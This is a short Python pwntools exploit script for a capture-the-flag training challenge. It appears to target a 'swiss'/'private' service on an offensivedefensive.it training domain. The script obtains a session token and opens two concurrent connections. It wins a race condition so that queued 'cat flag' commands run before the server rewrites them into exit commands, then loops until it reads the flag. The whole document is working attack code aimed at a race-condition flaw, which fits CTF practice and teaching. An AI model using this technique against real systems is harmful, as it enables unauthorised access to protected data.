from pwn import *

# This program allows you to create a cmd chain and print, delete or execute it. Cmd 'f' means cat flag, but all the 'f' commands are replaced with 'q' ones (exit with insult :O) as soon as the chain is ready. The trick here is to connect to the same session with another thread and make it execute the cmd chain while the first process is creating it, so that 'f' cmds are not changed into 'q' ones in time.

def get_token(c) :
    c.recvuntil(b"token: ")
    return c.recvline().strip()

def writeCmds(c) :
    c.recvuntil(b"chain\n")
    c.sendline(b'1')
    c.recvuntil(b"> ")
    c.send(cmd_chain)
    print(c.recvline().decode("utf-8"))

def execCmds(c) :
    while True :
        c.recvuntil(b"chain\n")
        c.sendline(b'4')
        c.recvline()
        str = c.recvline().decode("utf-8")

        if "flag{" in str :
            return str

cmd_chain = b'f' * 15

c_token = remote("swiss.training.offensivedefensive.it", 8080, ssl = True)
token = get_token(c_token)
c_token.close()
print(token)

c1 = remote("private.training.offensivedefensive.it", 8080, ssl = True)
c1.recvuntil(b"Token: ")
c1.sendline(token)
c2 = remote("private.training.offensivedefensive.it", 8080, ssl = True)
c2.recvuntil(b"Token: ")
c2.sendline(token)

c1.recvuntil(b"chain\n")
c2.recvuntil(b"chain\n")

writeCmds(c1)
flag = execCmds(c2)

print(flag)

c1.close()
c2.close()